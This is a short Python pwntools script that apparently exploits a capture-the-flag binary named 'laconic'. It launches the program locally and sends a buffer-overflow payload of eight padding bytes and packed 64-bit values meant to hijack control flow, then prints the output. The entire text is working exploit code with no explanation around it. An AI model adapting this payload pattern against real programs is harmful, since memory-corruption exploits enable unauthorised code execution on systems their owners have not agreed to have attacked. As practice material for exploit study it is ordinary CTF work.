from pwn import *

context.binary = elf = ELF('laconic')

pr = process()

pr.send(b'A'*8+p64(0x43018)+p64(1)+p64(43000))

print(pr.recvall())